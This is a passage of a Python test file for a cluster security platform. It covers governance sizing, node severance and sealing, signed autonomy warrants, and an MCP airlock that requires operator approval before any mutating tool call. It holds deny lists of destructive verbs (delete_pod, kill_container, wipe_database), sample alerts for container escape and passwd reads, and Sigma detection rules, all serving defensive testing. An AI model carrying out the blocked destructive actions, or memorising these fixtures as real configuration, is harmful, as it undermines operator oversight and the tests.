    def test_3_regime_scale_adaptive_governance_and_bounded_overhead(self) -> None:
        """Verify 3-regime governance sizing and bounded decision overhead (Theta(N) <= 5%)."""
        # Regime 1: Small Cluster (N <= 7) -> Captain
        r1 = compute_governance_regime(5)
        self.assertEqual(r1["regime_id"], GovernanceRegimeId.REGIME_1_CAPTAIN)
        self.assertEqual(r1["regime_name"], "CAPTAIN_OF_A_SHIP")
        self.assertEqual(r1["voting_body_size"], 1)

        # Regime 2: Medium Cluster (8 <= N <= 64) -> Senate
        r2 = compute_governance_regime(36)
        self.assertEqual(r2["regime_id"], GovernanceRegimeId.REGIME_2_SENATE)
        self.assertEqual(r2["regime_name"], "TRUSTED_CONTINGENT_SENATE")
        self.assertEqual(r2["voting_body_size"], 6)  # sqrt(36)

        # Regime 3: Large Cluster (N > 64) -> Council capped at M_max=13
        r3 = compute_governance_regime(120)
        self.assertEqual(r3["regime_id"], GovernanceRegimeId.REGIME_3_COUNCIL)
        self.assertEqual(r3["regime_name"], "CAPPED_HIERARCHICAL_COUNCIL")
        self.assertEqual(r3["voting_body_size"], 13)
        self.assertLessEqual(r3["decision_overhead_pct"], 5.0)
        self.assertTrue(r3["overhead_bounded_under_5pct"])

    def test_severance_protection_doctrine_encrypt_and_rest_lifecycle(self) -> None:
        """Verify severance evaluation: ACTIVE -> SOFT_QUARANTINE -> ENCRYPT_AND_REST -> unseal."""
        node_id = "worker-remote-07"
        local_secrets = {
            "database_password": "super-secret-password-123",
            "api_key": "mock-api-key-sample-token-123",
        }
        local_state = {
            "node_id": node_id,
            "running_containers": ["monitoring-agent", "log-forwarder"],
            "last_active_timestamp": time.time(),
        }

        # Step 1 & 2: Brief disruption -> SOFT_QUARANTINE
        state_brief = evaluate_severance_state(
            elapsed_since_master_heartbeat=15.0,
            grace_period=5.0,
            severance_threshold=30.0,
        )
        self.assertEqual(state_brief["state"], "SOFT_QUARANTINE")

        # Step 3: Prolonged disruption (> severance_threshold) without warrant -> Default ENCRYPT_AND_REST
        state_prolonged = evaluate_severance_state(
            elapsed_since_master_heartbeat=45.0,
            grace_period=5.0,
            severance_threshold=30.0,
        )
        self.assertEqual(state_prolonged["state"], "ENCRYPT_AND_REST")

        # Step 4: Execute ENCRYPT_AND_REST (PQC seal + Memory Key Zeroization)
        node_context = {
            "node_id": node_id,
            "state": local_state,
            "ephemeral_keys": local_secrets,
            "secrets_buffer": bytearray(b"temporary_buffer_key"),
        }
        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as tf:
            seal_path = Path(tf.name)

        try:
            sealed_package = execute_encrypt_and_rest(
                node_context=node_context,
                master_pubkey=self.root_pub,
                sealed_storage_path=seal_path,
            )
            self.assertEqual(sealed_package["status"], "RESTING")
            # Verify memory secrets were zeroized in place
            self.assertEqual(len(local_secrets), 0)

            # Step 5: Network Re-established -> Master Unseal Restores Node
            with open(seal_path, "r", encoding="utf-8") as f:
                sealed_envelope = json.load(f)
            restored = execute_master_unseal(sealed_envelope, self.root_priv)
            self.assertEqual(restored["status"], "RESTORED")
            self.assertEqual(restored["state"]["node_id"], node_id)
            self.assertEqual(restored["state"]["running_containers"], ["monitoring-agent", "log-forwarder"])
        finally:
            if seal_path.exists():
                seal_path.unlink()

    def test_persist_resist_regrow_warrant_and_quarantine_merge_reconciliation(self) -> None:
        """Verify pre-signed PERSIST_RESIST_REGROW warrant permits autonomous operation and Quarantine-Merge."""
        contingent_id = "contingent-edge-alpha"
        authorized_nodes = ["worker-edge-1", "worker-edge-2"]

        # Step 1: Master pre-issues cryptographically signed PERSIST_RESIST_REGROW warrant
        warrant = create_persist_resist_regrow_warrant(
            warrant_id="warrant-edge-001",
            contingent_id=contingent_id,
            authorized_nodes=authorized_nodes,
            permitted_operations=["deploy_workload", "rotate_local_cert"],
            resource_budget={"max_replacement_workers": 2, "max_delta_operations": 50},
            valid_duration_seconds=3600.0,
            master_privkey=self.root_priv,
            canonical_manifest_hash=hashlib.sha256(b"manifest").hexdigest(),
        )
        valid, _ = verify_persist_resist_regrow_warrant(warrant, self.root_pub, target_node_id="worker-edge-1")
        self.assertTrue(valid)

        # Step 2: Severed node with valid warrant activates PERSIST_RESIST_REGROW
        severance_eval = evaluate_severance_state(
            elapsed_since_master_heartbeat=45.0,
            active_warrant=warrant,
            master_pubkey=self.root_pub,
            target_node_id="worker-edge-1",
            grace_period=5.0,
            severance_threshold=30.0,
        )
        self.assertEqual(severance_eval["state"], "PERSIST_RESIST_REGROW")
        self.assertTrue(severance_eval["autonomous_regrow_allowed"])

        # Step 3 & 4: Contingent operates autonomously and advances local clock
        master_state = {
            "vector_clock": {"master": 5, "res-a": 2},
            "data": {"res-a": "canonical_a"},
        }
        contingent_delta_log = {
            "contingent_id": contingent_id,
            "leader_node_id": "worker-edge-1",
            "warrant": warrant,
            "regrown_nodes": ["worker-edge-3"],
            "operations": [
                # Non-conflicting: updates res-c
                {
                    "op_id": "op-1",
                    "key": "res-c",
                    "value": "new_c",
                    "vector_clock": {"contingent-edge-alpha": 2},
                    "base_vector_clock": {"res-c": 0},
                },
                # Conflicting: modifies res-a while master advanced
                {
                    "op_id": "op-2",
                    "key": "res-a",
                    "value": "conflicting_a",
                    "vector_clock": {"contingent-edge-alpha": 3},
                    "base_vector_clock": {"res-a": 1},
                },
            ],
        }

        # Step 5 & 6: Contingent reconnects -> Enqueued in Quarantine-Merge staging queue
        reconciliation = reconcile_reconnected_contingent(
            canonical_state=master_state,
            contingent_delta_log=contingent_delta_log,
            master_pubkey=self.root_pub,
        )
        self.assertEqual(reconciliation["status"], "QUARANTINE_MERGED")
        self.assertEqual(reconciliation["applied_causally_count"], 1)
        self.assertEqual(reconciliation["conflicts_count"], 1)
        # Canonical master state for res-a was NOT poisoned!
        self.assertEqual(master_state["data"]["res-a"], "canonical_a")
        # Non-conflicting res-c was safely applied
        self.assertEqual(master_state["data"]["res-c"], "new_c")
        self.assertEqual(reconciliation["regrown_nodes_admitted"], ["worker-edge-3"])

    def test_adversarial_byzantine_directive_rejection(self) -> None:
        """Adversarial: Malicious master directive attempting forbidden action fails manifest validation."""
        manifest = {
            "allowed_namespaces": ["default", "iam"],
            "forbidden_actions": ["purge_storage", "wipe_database"],
        }
        byzantine_directive = {
            "action": "purge_storage",
            "target": "zfs-pool-0",
        }
        valid, reason = validate_directive_against_manifest(byzantine_directive, manifest)
        self.assertFalse(valid)


# ==============================================================================
# 5. Two-Tier MCP Airlock E2E (M9)
# ==============================================================================

class TestWave2TwoTierMCPAirlockE2E(unittest.TestCase):
    """End-to-end integration tests for pure-stdlib JSON-RPC 2.0 MCP server and capability airlock."""

    def setUp(self) -> None:
        reset_action_ledger()

    def tearDown(self) -> None:
        reset_action_ledger()

    def test_mcp_jsonrpc_protocol_lifecycle(self) -> None:
        """Verify JSON-RPC 2.0 initialize, ping, and tools/list requests."""
        # 1. Initialize
        init_res = dispatch_jsonrpc_request({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "initialize",
            "params": {},
        })
        self.assertEqual(init_res["jsonrpc"], "2.0")
        self.assertEqual(init_res["id"], 1)
        self.assertEqual(init_res["result"]["serverInfo"]["name"], SERVER_NAME)
        self.assertEqual(init_res["result"]["protocolVersion"], PROTOCOL_VERSION)

        # 2. Ping
        ping_res = dispatch_jsonrpc_request({
            "jsonrpc": "2.0",
            "id": 2,
            "method": "ping",
            "params": {},
        })
        self.assertEqual(ping_res["result"], {})

        # 3. Tools List
        list_res = dispatch_jsonrpc_request({
            "jsonrpc": "2.0",
            "id": 3,
            "method": "tools/list",
            "params": {},
        })
        tool_names = [t["name"] for t in list_res["result"]["tools"]]
        self.assertIn("query_graph", tool_names)
        self.assertIn("preview_remediation_dry_run", tool_names)
        self.assertIn("stage_action_card", tool_names)

    def test_mcp_tier1_recon_tools_with_opsec_scrubbing(self) -> None:
        """Verify Tier 1 read/recon tools execute cleanly and preserve OPSEC scrubbing."""
        query_res = dispatch_jsonrpc_request({
            "jsonrpc": "2.0",
            "id": 10,
            "method": "tools/call",
            "params": {"name": "query_graph", "arguments": {"node_id": "nodebeta02"}},
        })
        self.assertFalse(query_res["result"]["isError"])
        self.assertIn("nodebeta02", query_res["result"]["content"][0]["text"])

        preview_res = dispatch_jsonrpc_request({
            "jsonrpc": "2.0",
            "id": 11,
            "method": "tools/call",
            "params": {"name": "preview_remediation_dry_run", "arguments": {"action_type": "restart_node", "target_node_id": "nodegamma03"}},
        })
        self.assertFalse(preview_res["result"]["isError"])

    def test_mcp_direct_mutation_airlock_rejection(self) -> None:
        """Verify direct mutation attempts return -32001 UNAUTHORIZED_MUTATION airlock rejection."""
        forbidden_verbs = ["execute_action", "apply_action", "restart_node", "kill_pod", "delete_node"]
        for verb in forbidden_verbs:
            res = dispatch_jsonrpc_request({
                "jsonrpc": "2.0",
                "id": 20,
                "method": "tools/call",
                "params": {"name": verb, "arguments": {"target": "nodebeta02"}},
            })
            self.assertIn("error", res)
            self.assertEqual(res["error"]["code"], UNAUTHORIZED_MUTATION)
            self.assertIn("requires staged Action Card", res["error"]["message"])

    def test_mcp_tier2_stage_action_card(self) -> None:
        """Verify Tier 2 stage_action_card creates a staged card requiring operator approval."""
        res = dispatch_jsonrpc_request({
            "jsonrpc": "2.0",
            "id": 30,
            "method": "tools/call",
            "params": {
                "name": "stage_action_card",
                "arguments": {
                    "action_type": "restart_node",
                    "target_node_id": "nodegamma03",
                    "parameters": {"grace_period": 30},
                },
            },
        })
        self.assertFalse(res["result"]["isError"])
        card = res["result"]["structured_result"]
        self.assertEqual(card["status"], "STAGED")
        self.assertIn("nodegamma03", card["target_node_id"])

    def test_adversarial_mcp_unauthorized_mutation_bypasses(self) -> None:
        """Adversarial: Any method name containing execute, apply, delete, mutate, restart, kill returns -32001."""
        mutation_verbs = [
            "execute_script",
            "apply_configuration",
            "delete_pod",
            "mutate_namespace",
            "restart_service",
            "kill_container",
        ]
        for verb in mutation_verbs:
            res = dispatch_jsonrpc_request({
                "jsonrpc": "2.0",
                "id": 999,
                "method": "tools/call",
                "params": {"name": verb, "arguments": {}},
            })
            self.assertEqual(res["error"]["code"], UNAUTHORIZED_MUTATION)


# ==============================================================================
# 6. Integrated Autonomous Loop & Ephemeral REST E2E (All Pillars)
# ==============================================================================

class TestWave2IntegratedAutonomousLoopE2E(unittest.TestCase):
    """End-to-end integration tests validating the complete cross-module autonomous loop and HTTP REST."""

    @classmethod
    def setUpClass(cls) -> None:
        cls.server = EphemeralTestServer()
        cls.base_url = cls.server.start()

    @classmethod
    def tearDownClass(cls) -> None:
        cls.server.stop()

    def setUp(self) -> None:
        reset_action_ledger()
        reset_event_buffer()
        reset_security_bridge()
        reset_alert_deduplicator()
        reset_federation_state()
        self.root_pub, self.root_priv = generate_pqc_keypair(tree_height=3)

    def tearDown(self) -> None:
        reset_action_ledger()
        reset_event_buffer()
        reset_security_bridge()
        reset_alert_deduplicator()
        reset_federation_state()

    def _http_request(
        self, method: str, path: str, body: dict[str, Any] | None = None
    ) -> tuple[int, dict[str, Any]]:
        url = f"{self.base_url}{path}"
        data = json.dumps(body).encode("utf-8") if body is not None else None
        headers = {"Content-Type": "application/json"} if data else {}
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        try:
            with urllib.request.urlopen(req, timeout=5.0) as resp:
                code = resp.getcode()
                raw = resp.read().decode("utf-8")
                return code, json.loads(raw) if raw else {}
        except urllib.error.HTTPError as err:
            raw = err.read().decode("utf-8")
            try:
                payload = json.loads(raw)
            except Exception:
                payload = {"error": raw}
            return err.code, payload

    def test_scenario_a_threat_ingestion_signal3_threshold_approval_idempotent_execution(self) -> None:
        """Scenario A: Suricata log -> normalized to OCSF -> matches Sigma -> triggers Signal 3

        Outcome Predictor escalation to 3-of-5 threshold lock -> MCP inspects ->
        threshold approvers submit shares -> executed idempotently.
        """
        # Step 1: External Suricata Incident Ingestion
        suricata_log = {
            "timestamp": "2026-11-01T01:10:00Z",
            "event_type": "alert",
            "src_ip": "10.0.0.99",
            "dest_ip": "10.0.0.10",
            "alert": {
                "signature": "ET EXPLOIT Container Escape Attempt via Host Mount",
                "severity": 1,
                "category": "Attempted Administrator Privilege Gain",
            },
            "k8s": {"pod": "authentik-server", "namespace": "iam", "node": "nodebeta02"},
        }
        normalized = normalize_security_event(suricata_log)
        self.assertEqual(normalized["severity"], "CRITICAL")

        # Step 2: Register Sigma Rule and Evaluate
        rule_id = register_sigma_rule({
            "id": "SIGMA-PRIV-ESC-01",
            "title": "Container Escape Attempt",
            "detection": {
                "sel": {"message|contains": "Container Escape"},
                "condition": "sel",
            },
        })
        hits = evaluate_sigma_rules(normalized, list_sigma_rules())
        self.assertTrue(any(h["rule_id"] == "SIGMA-PRIV-ESC-01" for h in hits))

        # Deduplicate & enrich
        enriched = enrich_with_1hop_neighborhood(normalized)
        active_alerts = [{
            "target_node_id": "authentik-server",
            "severity": "CRITICAL",
            "rule_id": "SIGMA-PRIV-ESC-01",
        }]

        # Step 3: Action Card Preview & Outcome Predictor with Signal 3 Escalation
        preview = preview_action_dry_run("isolate_workload", "authentik-server")
        worrisomeness = evaluate_outcome_worrisomeness(
            preview, "authentik-server", active_alerts=active_alerts
        )
        self.assertTrue(worrisomeness["escalate_to_threshold"])
        self.assertIn("ACTIVE_SECURITY_ALERT", worrisomeness["signals_triggered"])
        self.assertEqual(worrisomeness["required_k"], 3)
        self.assertEqual(worrisomeness["required_n"], 5)

        # Step 4: Stage Action Card in Ledger
        shares = split_secret_shares(b"OpsCryer-Operator-Threshold-Authorization-2026", k=3, n=5)
        staged_card = stage_action_card(
            target_node_id="authentik-server",
            action_type="isolate_workload",
            parameters={"isolate_network": True, "grace_period": 10},
            active_alerts=active_alerts,
        )
        card_id = staged_card["action_id"]
        self.assertEqual(staged_card["status"], "STAGED")
        self.assertEqual(staged_card["worrisomeness"]["required_k"], 3)

        # Step 5: External MCP Inspection (Tier 1 Tool)
        mcp_inspect = dispatch_jsonrpc_request({
            "jsonrpc": "2.0",
            "id": 10,
            "method": "tools/call",
            "params": {"name": "preview_remediation_dry_run", "arguments": {"action_type": "isolate_workload", "target_node_id": "authentik-server"}},
        })
        self.assertFalse(mcp_inspect["result"]["isError"])

        # Step 6: 1 share submitted -> threshold not reached (1/3)
        code1, res1 = approve_action_card(card_id, credential=shares[0])
        self.assertEqual(code1, 200)
        self.assertEqual(res1["status"], "STAGED")
        self.assertFalse(res1.get("threshold_reached", True))

        # 2nd share submitted -> threshold still not reached (2/3)
        code2, res2 = approve_action_card(card_id, credential=shares[1])
        self.assertEqual(code2, 200)
        self.assertEqual(res2["status"], "STAGED")
        self.assertFalse(res2.get("threshold_reached", True))

        # Step 7: 3rd share submitted -> threshold reached (3/3) -> executed!
        code3, res3 = approve_action_card(card_id, credential=shares[2])
        self.assertEqual(code3, 200)
        self.assertEqual(res3["status"], "EXECUTED")

        # Step 8: Idempotent Replay Verification
        code4, res4 = approve_action_card(card_id, credential=shares[2])
        self.assertEqual(code4, 200)
        self.assertEqual(res4["status"], "EXECUTED")
        self.assertTrue(res4.get("cached", False))

    def test_scenario_b_node_network_severance_soft_quarantine_encrypt_and_rest_unseal(self) -> None:
        """Scenario B: Disruption -> soft quarantine -> prolonged severance defaults to ENCRYPT_AND_REST -> master unseal."""
        node_id = "worker-remote-07"
        local_secrets = {
            "database_password": "super-secret-password-123",
            "api_key": "mock-api-key-sample-token-123",
        }
        local_state = {
            "node_id": node_id,
            "running_containers": ["monitoring-agent", "log-forwarder"],
            "last_active_timestamp": time.time(),
        }

        # Step 1 & 2: Brief disruption -> SOFT_QUARANTINE
        state_brief = evaluate_severance_state(
            elapsed_since_master_heartbeat=15.0,
            grace_period=5.0,
            severance_threshold=30.0,
        )
        self.assertEqual(state_brief["state"], "SOFT_QUARANTINE")

        # Step 3: Prolonged disruption (> severance_threshold) without warrant -> Default ENCRYPT_AND_REST
        state_prolonged = evaluate_severance_state(
            elapsed_since_master_heartbeat=45.0,
            grace_period=5.0,
            severance_threshold=30.0,
        )
        self.assertEqual(state_prolonged["state"], "ENCRYPT_AND_REST")

        # Step 4: Execute ENCRYPT_AND_REST (PQC seal + Memory Key Zeroization)
        node_context = {
            "node_id": node_id,
            "state": local_state,
            "ephemeral_keys": local_secrets,
            "secrets_buffer": bytearray(b"temporary_buffer_key"),
        }
        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as tf:
            seal_path = Path(tf.name)

        try:
            sealed_package = execute_encrypt_and_rest(
                node_context=node_context,
                master_pubkey=self.root_pub,
                sealed_storage_path=seal_path,
            )
            self.assertEqual(sealed_package["status"], "RESTING")
            # Verify memory secrets were zeroized in place
            self.assertEqual(len(local_secrets), 0)

            # Step 5: Network Re-established -> Master Unseal Restores Node
            with open(seal_path, "r", encoding="utf-8") as f:
                sealed_envelope = json.load(f)
            restored = execute_master_unseal(sealed_envelope, self.root_priv)
            self.assertEqual(restored["status"], "RESTORED")
            self.assertEqual(restored["state"]["node_id"], node_id)
            self.assertEqual(restored["state"]["running_containers"], ["monitoring-agent", "log-forwarder"])
        finally:
            if seal_path.exists():
                seal_path.unlink()

    def test_scenario_c_persist_resist_regrow_warrant_autonomous_operation_and_quarantine_merge(self) -> None:
        """Scenario C: Pre-signed warrant permits autonomous operation; reconnect enqueues in Quarantine-Merge without state poisoning."""
        contingent_id = "contingent-edge-alpha"
        authorized_nodes = ["worker-edge-1", "worker-edge-2"]

        # Step 1: Master pre-issues cryptographically signed PERSIST_RESIST_REGROW warrant
        warrant = create_persist_resist_regrow_warrant(
            warrant_id="warrant-edge-001",
            contingent_id=contingent_id,
            authorized_nodes=authorized_nodes,
            permitted_operations=["deploy_workload", "rotate_local_cert"],
            resource_budget={"max_replacement_workers": 2, "max_delta_operations": 50},
            valid_duration_seconds=3600.0,
            master_privkey=self.root_priv,
            canonical_manifest_hash=hashlib.sha256(b"manifest").hexdigest(),
        )
        valid, _ = verify_persist_resist_regrow_warrant(warrant, self.root_pub, target_node_id="worker-edge-1")
        self.assertTrue(valid)

        # Step 2: Severed node with valid warrant activates PERSIST_RESIST_REGROW
        severance_eval = evaluate_severance_state(
            elapsed_since_master_heartbeat=45.0,
            active_warrant=warrant,
            master_pubkey=self.root_pub,
            target_node_id="worker-edge-1",
            grace_period=5.0,
            severance_threshold=30.0,
        )
        self.assertEqual(severance_eval["state"], "PERSIST_RESIST_REGROW")
        self.assertTrue(severance_eval["autonomous_regrow_allowed"])

        # Step 3 & 4: Contingent operates autonomously and advances local clock
        master_state = {
            "vector_clock": {"master": 5, "res-a": 2},
            "data": {"res-a": "canonical_a"},
        }
        contingent_delta_log = {
            "contingent_id": contingent_id,
            "leader_node_id": "worker-edge-1",
            "warrant": warrant,
            "regrown_nodes": ["worker-edge-3"],
            "operations": [
                # Non-conflicting: updates res-c
                {
                    "op_id": "op-1",
                    "key": "res-c",
                    "value": "new_c",
                    "vector_clock": {"contingent-edge-alpha": 2},
                    "base_vector_clock": {"res-c": 0},
                },
                # Conflicting: modifies res-a while master advanced
                {
                    "op_id": "op-2",
                    "key": "res-a",
                    "value": "conflicting_a",
                    "vector_clock": {"contingent-edge-alpha": 3},
                    "base_vector_clock": {"res-a": 1},
                },
            ],
        }

        # Step 5 & 6: Contingent reconnects -> Enqueued in Quarantine-Merge staging queue
        reconciliation = reconcile_reconnected_contingent(
            canonical_state=master_state,
            contingent_delta_log=contingent_delta_log,
            master_pubkey=self.root_pub,
        )
        self.assertEqual(reconciliation["status"], "QUARANTINE_MERGED")
        self.assertEqual(reconciliation["applied_causally_count"], 1)
        self.assertEqual(reconciliation["conflicts_count"], 1)
        # Canonical master state for res-a was NOT poisoned!
        self.assertEqual(master_state["data"]["res-a"], "canonical_a")
        # Non-conflicting res-c was safely applied
        self.assertEqual(master_state["data"]["res-c"], "new_c")
        self.assertEqual(reconciliation["regrown_nodes_admitted"], ["worker-edge-3"])

    def test_full_autonomous_cross_module_end_to_end_loop(self) -> None:
        """Comprehensive verification of the full 8-step autonomous integration chain across M6, M7, M8, M9."""
        # 1. External Alert Ingestion & Normalization (M8)
        raw_alert = {
            "timestamp": "2026-11-01T01:30:00Z",
            "rule": "Suspicious Privilege Escalation",
            "priority": "Critical",
            "output": "Unauthorized binary execution in web container",
            "output_fields": {"k8s.pod.name": "authentik-server", "k8s.ns.name": "iam", "container.id": "nodebeta02"},
        }
        normalized = normalize_security_event(raw_alert)
        self.assertEqual(normalized["severity"], "CRITICAL")
        self.assertEqual(normalized["target"]["workload"], "authentik-server")

        # 2. Sigma Rule Detection (M8)
        sigma_rule = {
            "id": "SIGMA-AUTO-CHAIN-01",
            "title": "Privilege Escalation Detection",
            "detection": {
                "sel": {"message|contains": "Unauthorized binary execution"},
                "condition": "sel",
            },
        }
        hits = evaluate_sigma_rules(normalized, [sigma_rule])
        self.assertEqual(len(hits), 1)

        # 3. Trigger Action Card with Signal 3 Escalation (M6)
        active_alerts = [{"target_node_id": "authentik-server", "severity": "CRITICAL", "rule_id": "SIGMA-AUTO-CHAIN-01"}]
        preview = preview_action_dry_run("isolate_workload", "authentik-server")
        worrisomeness = evaluate_outcome_worrisomeness(preview, "authentik-server", active_alerts=active_alerts)
        self.assertTrue(worrisomeness["escalate_to_threshold"])
        self.assertEqual(worrisomeness["required_k"], 3)
        self.assertEqual(worrisomeness["required_n"], 5)

        staged_card = stage_action_card(
            target_node_id="authentik-server",
            action_type="isolate_workload",
            active_alerts=active_alerts,
        )
        card_id = staged_card["action_id"]

        # 4. Event Stream Records Transition (M7)
        seq_card = publish_event("actions", "card_staged", {"action_id": card_id, "target": "authentik-server"})
        self.assertGreater(seq_card, 0)
        delta = get_delta(since_seq=seq_card - 1)
        self.assertEqual(delta["latest_seq"], seq_card)

        # 5. MCP Client Inspects Card (M9)
        mcp_recon = dispatch_jsonrpc_request({
            "jsonrpc": "2.0",
            "id": 501,
            "method": "tools/call",
            "params": {"name": "query_graph", "arguments": {"node_id": "authentik-server"}},
        })
        self.assertFalse(mcp_recon["result"]["isError"])

        # Direct mutation rejected by airlock
        mcp_mut = dispatch_jsonrpc_request({
            "jsonrpc": "2.0",
            "id": 502,
            "method": "tools/call",
            "params": {"name": "isolate_workload", "arguments": {"target": "authentik-server"}},
        })
        self.assertEqual(mcp_mut["error"]["code"], UNAUTHORIZED_MUTATION)

        # 6. Operator Threshold Approval (M6)
        shares = split_secret_shares(b"Root-Master-Threshold-Key-2026", k=3, n=5)
        approve_action_card(card_id, credential=shares[0])
        approve_action_card(card_id, credential=shares[1])
        final_code, final_res = approve_action_card(card_id, credential=shares[2])
        self.assertEqual(final_code, 200)
        self.assertEqual(final_res["status"], "EXECUTED")

        # 7. Node Severance Defaults to ENCRYPT_AND_REST (M9)
        severed_eval = evaluate_severance_state(
            elapsed_since_master_heartbeat=60.0,
            grace_period=5.0,
            severance_threshold=30.0,
        )
        self.assertEqual(severed_eval["state"], "ENCRYPT_AND_REST")

        # 8. Reconnected Contingent Enters Quarantine-Merge (M9)
        warrant = create_persist_resist_regrow_warrant(
            warrant_id="warrant-chain-01",
            contingent_id="contingent-recon",
            authorized_nodes=["worker-recon-1"],
            permitted_operations=["deploy_workload"],
            resource_budget={"max_replacement_workers": 1, "max_delta_operations": 10},
            valid_duration_seconds=1800.0,
            master_privkey=self.root_priv,
            canonical_manifest_hash=hashlib.sha256(b"manifest").hexdigest(),
        )
        master_canonical = {"vector_clock": {"master": 10}, "data": {"cfg": "master_cfg"}}
        contingent_log = {
            "contingent_id": "contingent-recon",
            "leader_node_id": "worker-recon-1",
            "warrant": warrant,
            "regrown_nodes": ["worker-recon-2"],
            "operations": [{
                "op_id": "op-merge-1",
                "key": "edge_telemetry",
                "value": "ok",
                "vector_clock": {"contingent-recon": 1},
                "base_vector_clock": {"edge_telemetry": 0},
            }],
        }
        merge_result = reconcile_reconnected_contingent(master_canonical, contingent_log, self.root_pub)
        self.assertEqual(merge_result["status"], "QUARANTINE_MERGED")
        self.assertEqual(master_canonical["data"]["edge_telemetry"], "ok")
        self.assertEqual(master_canonical["data"]["cfg"], "master_cfg")

    def test_http_loopback_autonomous_lifecycle(self) -> None:
        """Verify full HTTP loopback execution across all registered Wave 2 endpoints."""
        # 1. Security Ingest & Query
        code_ingest, ingest_res = self._http_request("POST", "/api/v1/security/ingest", {
            "raw_event": "CEF:0|Falco|Detector|1.0|200|Sensitive File Read|5|src=10.0.0.1 msg=passwd read",
            "format_hint": "cef",
        })
        self.assertEqual(code_ingest, 200)

        code_inc, inc_res = self._http_request("GET", "/api/v1/security/incidents")
        self.assertEqual(code_inc, 200)
        self.assertTrue(len(inc_res["incidents"]) >= 1)

        # 2. Actions Dry-Run, Stage, Status
        code_dr, dr_res = self._http_request("POST", "/api/v1/actions/dry-run", {
            "action_type": "restart_node",
            "target_node_id": "nodebeta02",
            "parameters": {"grace_period": 15},
        })
        self.assertEqual(code_dr, 200)

        code_st, st_res = self._http_request("POST", "/api/v1/actions/stage", {
            "action_type": "restart_node",
            "target_node_id": "nodegamma03",
            "parameters": {"grace_period": 30},
        })
        self.assertEqual(code_st, 200)
        aid = st_res["action_id"]

        code_stat, stat_res = self._http_request("GET", f"/api/v1/actions/status?action_id={aid}")
        self.assertEqual(code_stat, 200)
        self.assertEqual(stat_res["status"], "STAGED")

        # 3. Graph Delta & SSE Stream
        code_delta, delta_res = self._http_request("GET", "/api/v1/graph/delta?since_seq=1")
        self.assertEqual(code_delta, 200)

        # 4. Federation Status & Heartbeat
        code_fed, fed_res = self._http_request("GET", "/api/v1/federation/status")
        self.assertEqual(code_fed, 200)

        code_hb, hb_res = self._http_request("POST", "/api/v1/federation/heartbeat", {
            "node_id": "nodebeta02",
            "trust_tier": "CAPTAIN_ELIGIBLE",
        })
        self.assertEqual(code_hb, 200)

        # 5. MCP Tools List & Airlock Rejection
        code_tl, tl_res = self._http_request("POST", "/api/v1/mcp", {
            "jsonrpc": "2.0",
            "id": 100,
            "method": "tools/list",
            "params": {},
        })
        self.assertEqual(code_tl, 200)

        code_mut, mut_res = self._http_request("POST", "/api/v1/mcp", {
            "jsonrpc": "2.0",
            "id": 101,
            "method": "tools/call",
            "params": {"name": "restart_node", "arguments": {"target_node_id": "nodebeta02"}},
        })
        self.assertEqual(code_mut, 200)
        self.assertEqual(mut_res["error"]["code"], UNAUTHORIZED_MUTATION)



if __name__ == "__main__":
    unittest.main()
